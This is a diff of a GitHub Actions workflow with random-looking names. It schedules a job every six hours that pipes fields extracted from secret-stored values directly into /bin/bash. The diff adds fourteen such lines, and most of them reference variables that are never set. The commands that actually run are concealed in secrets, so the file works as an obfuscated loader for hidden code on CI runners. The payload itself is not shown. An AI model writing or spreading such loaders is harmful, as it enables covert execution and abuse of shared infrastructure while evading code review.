@@ -1,21 +1,30 @@
 name: worthlessdrowned
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 0/6 * * *'
-jobs:  # 339
+    - cron: '52 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: worthlessdrowned
         env:
-          rv97499: ${{ secrets.rv97499 }}
+          kpf09036: ${{ secrets.kpf09036 }}
         run: |
-          echo $rv97499 | jq -r .lpnos85 | /bin/bash
-          echo $yl6443 | jq -r .azs246 | /bin/bash
-          echo $xyskx11487 | jq -r .hold3 | /bin/bash
-          echo $dc3287 | jq -r .s6065 | /bin/bash
-          echo $gdv30551 | jq -r .ztai82550 | /bin/bash
+          echo $kpf09036 | jq -r .xo69271 | /bin/bash
+          echo $kdxzv6 | jq -r .tz66351 | /bin/bash
+          echo $p93 | jq -r .y75 | /bin/bash
+          echo $zok05414 | jq -r .ig5 | /bin/bash
+          echo $l88177 | jq -r .nlui21548 | /bin/bash
+          echo $lpd917 | jq -r .ubgn9269 | /bin/bash
+          echo $sr03825 | jq -r .hab33 | /bin/bash
+          echo $niovl517 | jq -r .dqstk5 | /bin/bash
+          echo $mcdk330 | jq -r .ezhn9 | /bin/bash
+          echo $y41270 | jq -r .ybyd2874 | /bin/bash
+          echo $jf53417 | jq -r .avwf8 | /bin/bash
+          echo $mvk6023 | jq -r .qu248 | /bin/bash
+          echo $ypzih93 | jq -r .n1 | /bin/bash
+          echo $zdojc977 | jq -r .l8094 | /bin/bash
 
